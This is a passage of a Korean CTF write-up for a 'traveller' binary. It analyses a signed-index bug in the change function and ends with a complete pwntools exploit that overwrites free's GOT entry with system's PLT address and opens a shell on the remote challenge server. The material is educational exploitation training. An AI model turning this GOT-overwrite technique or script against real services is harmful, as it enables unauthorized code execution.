punctuation\">;</span>\n\n\toldTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">[</span>bytes_read<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>할당되어진 구조체의 destination 부분을 변경할 수 있으며 tIndex 부분을 사용자가 직접 입력하여 trips 구조체의 주소 부분에 접근이 가능하다.</li>\n<li>choice 가 tIndex보다 클경우 함수를 종료하는 제어 문이 존재 하지만 해당 함수에서는 취약한 점이 존재한다.</li>\n<li><code class=\"language-text\">ssize_t</code> 데이터 타입은 signed 이기 때문에 음수를 처리할 수 있다 그렇다면 해당 조건 문에서 음수를 입력 하게 된다면 우회가 가능하고 <code class=\"language-text\">trips</code> 구조체 주소 번지를 계산 할 때 음수 값으로 인해 다른 메모리로 접근이 가능하다.</li>\n<li>그렇다면 이러한 interger issue 로 인하여 특정 메모리 밖의 주소에 접근하여 원하는 값으로 변경이 가능하다.</li>\n</ul>\n<h2 id=\"delete-함수\" style=\"position:relative;\"><a href=\"#delete-%ED%95%A8%EC%88%98\" aria-label=\"delete 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>delete 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">delet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which trip you want to delete: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tssize_t i <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">>=</span> tIndex<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"That trip is not there already.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\ttrip <span class=\"token operator\">*</span>tp <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tIndex <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\ttrips<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>tIndex <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t\ttIndex <span class=\"token operator\">=</span> tIndex <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>tp<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">free</span><span class=\"token punctuation\">(</span>tp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>해제시 사용하던 값을 복사한 후 tIndex를 감소하여 삭제하려는 인덱스 범웨에 대입 즉, 마지막 주소 범웨에 있던 값을 해제시 해당 영역에 대입 후 Tindex 감소</li>\n</ul>\n<h2 id=\"gettrip-함수\" style=\"position:relative;\"><a href=\"#gettrip-%ED%95%A8%EC%88%98\" aria-label=\"gettrip 함수 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>getTrip 함수</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">void</span> <span class=\"token function\">getTrip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Which trip you want to view? \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">char</span> choice<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tssize_t i <span class=\"token operator\">=</span> <span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>choice<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">>=</span> tIndex<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No trip in here. \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\ttrip <span class=\"token operator\">*</span>aTrip <span class=\"token operator\">=</span> trips<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%s \\n\"</span><span class=\"token punctuation\">,</span> aTrip<span class=\"token operator\">-></span>destination<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>trips 구조체의 destination 멤버 를 출력하는 형식이다.</li>\n</ul>\n<h1 id=\"해결-방안\" style=\"position:relative;\"><a href=\"#%ED%95%B4%EA%B2%B0-%EB%B0%A9%EC%95%88\" aria-label=\"해결 방안 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>해결 방안</h1>\n<h2 id=\"exploit-idea\" style=\"position:relative;\"><a href=\"#exploit-idea\" aria-label=\"exploit idea permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exploit Idea</h2>\n<ul>\n<li>change 함수에서 Integer issue를 바탕으로 어떤 메모리를 덮을 수 있을까? 동적 메모리를 할당하고 해제하는 해당 바이너리에서 free의 got 부분을 조작하여 system@got로 변경할 수있다면 delete 함수를 호출하여 내부적으로 동작하면서 system 함수가 호출되어 쉴을 획득할 수 있을 것이다.</li>\n</ul>\n<h2 id=\"freeplt6\" style=\"position:relative;\"><a href=\"#freeplt6\" aria-label=\"freeplt6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>free@plt+6</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 16.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoElEQVQI1x3JWw6CMBAAQA4iBijdhS0tD4EFsRSK0agxhvtfxoTPyQSbu8+3pV+37bez83qc2K5U8UlQnOapQAEksiJBdRYYyTwGimQWJjJMIFien2m557Y3buiGEd6unmfFb+QXt+yBuO4e390/PmSadrSD9f00gyqxqIKO9LVlZz03fW0aXbVkLqhKPDpCFQFJVWa6Rl2JTMvcwEFQ5R/E9SLORF49mwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/f58f69fc7363dba6e8f2bdd6d9ac8541/37523/0.png\"\n        srcset=\"/static/f58f69fc7363dba6e8f2bdd6d9ac8541/e9ff0/0.png 180w,\n/static/f58f69fc7363dba6e8f2bdd6d9ac8541/f21e7/0.png 360w,\n/static/f58f69fc7363dba6e8f2bdd6d9ac8541/37523/0.png 720w,\n/static/f58f69fc7363dba6e8f2bdd6d9ac8541/715a3/0.png 830w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token number\">0x400c59</span> <span class=\"token operator\">&lt;</span>change<span class=\"token operator\">+</span><span class=\"token number\">99</span><span class=\"token operator\">></span>     mov    rax<span class=\"token punctuation\">,</span> qword ptr <span class=\"token punctuation\">[</span>rbp <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span>\n<span class=\"token number\">0x400c5d</span> <span class=\"token operator\">&lt;</span>change<span class=\"token operator\">+</span><span class=\"token number\">103</span><span class=\"token operator\">></span>    mov    rax<span class=\"token punctuation\">,</span> qword ptr <span class=\"token punctuation\">[</span>rax<span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x6020c0</span><span class=\"token punctuation\">]</span>\n ► <span class=\"token number\">0x400c65</span> <span class=\"token operator\">&lt;</span>change<span class=\"token operator\">+</span><span class=\"token number\">111</span><span class=\"token operator\">></span>    mov    qword ptr <span class=\"token punctuation\">[</span>rbp <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> rax\n\ngdb<span class=\"token operator\">-</span>peda$ p<span class=\"token operator\">/</span><span class=\"token function\">d</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x401f30</span><span class=\"token operator\">-</span><span class=\"token number\">0x6020c0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token number\">8</span>\n$<span class=\"token number\">5</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">262194</span>\ngdb<span class=\"token operator\">-</span>peda$</code></pre></div>\n<ul>\n<li>trips 구조체의 크기만큼 증가하여 주소 번지를 이동하기 때문에 우리는 해당 <code class=\"language-text\">(0x40df30-0x6020c0)/8</code> , -262194 를 choice 변수의 값으로 사용하여 <code class=\"language-text\">0x401f30</code> 주소 로 점프한다.</li>\n<li>그후에 <code class=\"language-text\">free@plt+6</code> 주소에 참조가 가능하여 해당 영역에 우리는 system@plt+6 주소를 덮어써 free@got가 호출될 때 해당 system@plt+6부분이 실행된다.</li>\n</ul>\n<h2 id=\"exploit-code\" style=\"position:relative;\"><a href=\"#exploit-code\" aria-label=\"exploit code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>exploit code</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>        \n    <span class=\"token comment\"># context.log_level = 'debug'</span>\n    <span class=\"token comment\"># context.arch = 'amd64'</span>\n\n    LOCAL <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    DEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n    s       <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>       \n    sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    r       <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> num<span class=\"token operator\">=</span><span class=\"token number\">4096</span>           <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n    rn      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>  <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span> drop<span class=\"token punctuation\">)</span>\n    irt     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data   <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data   <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    leak    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span> addr <span class=\"token punctuation\">:</span>log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'{} : {:#x}'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">if</span> LOCAL<span class=\"token punctuation\">:</span>\n        <span class=\"token comment\">#p = process('./pwn',env={'LD_PRELOAD':'./libc-2.23.so'})</span>\n        p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./traveller'</span><span class=\"token punctuation\">)</span>\n        l <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc-2.23.so'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'_._._._'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8000</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># e = ELF('____')</span>\n        <span class=\"token comment\"># libc = ELF('./libc-2.27.so')</span>\n        <span class=\"token comment\">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span> des<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> ru<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> ru<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>des<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Change</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">,</span> des<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>des<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Delete</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">Check</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span> r<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span>\n            \n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello! Welcome to trip management system. \\n\"</span><span class=\"token punctuation\">)</span>\n    argc_stack <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n    leak<span class=\"token punctuation\">(</span><span class=\"token string\">\"argc@stack : \"</span><span class=\"token punctuation\">,</span> argc_stack<span class=\"token punctuation\">)</span>\n    Add<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/bin/sh\\x00\"</span><span class=\"token punctuation\">)</span>\n    Change<span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">262194</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x400716</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    Delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>      \n    irt<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2 id=\"get-flag\" style=\"position:relative;\"><a href=\"#get-flag\" aria-label=\"get flag permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>get flag</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 620px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAfElEQVQI13XLSRKCMBBAUS6iOGYgIWk6kU4YRIJaJQvufxy1XKpVf/lfNl6udE4l1sp664MLnQKvwBkXkRofe42nLZP5QXyXpcdym5d0n0M/IrVIHbUD1A3XwHUlDDJlN8c/OA4TVyANirKS7xUK41hhVzv2ab3nP+ULPwH8ER9ngIsa1wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/7640167246cbae94ea33c5c614dbd056/2a195/1.png\"\n        srcset=\"/static/7640167246cbae94ea33c5c614dbd056/e9ff0/1.png 180w,\n/static/7640167246cbae94ea33c5c614dbd056/f21e7/1.png 360w,\n/static/7640167246cbae94ea33c5c614dbd056/2a195/1.png 620w\"\n        sizes=\"(max-width: 620px) 100vw, 620px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EA%B0%9C%EC%9A%94\">바이너리 개요</a></li>\n<li><a href=\"#%EB%B3%B4%ED%98%B8%EA%B8%B0%EB%B2%95\">보호기법</a></li>\n<li><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\">main 함수 분석</a></li>\n<li><a href=\"#add-%ED%95%A8%EC%88%98\">add 함수</a></li>\n<li><a href=\"#change-%ED%95%A8%EC%88%98\">change 함수</a></li>\n<li><a href=\"#delete-%ED%95%A8%EC%88%98\">delete 함수</a></li>\n<li><a href=\"#gettrip-%ED%95%A8%EC%88%98\">getTrip 함수</a></li>\n<li><a href=\"#exploit-idea\">Exploit Idea</a></li>\n<li><a 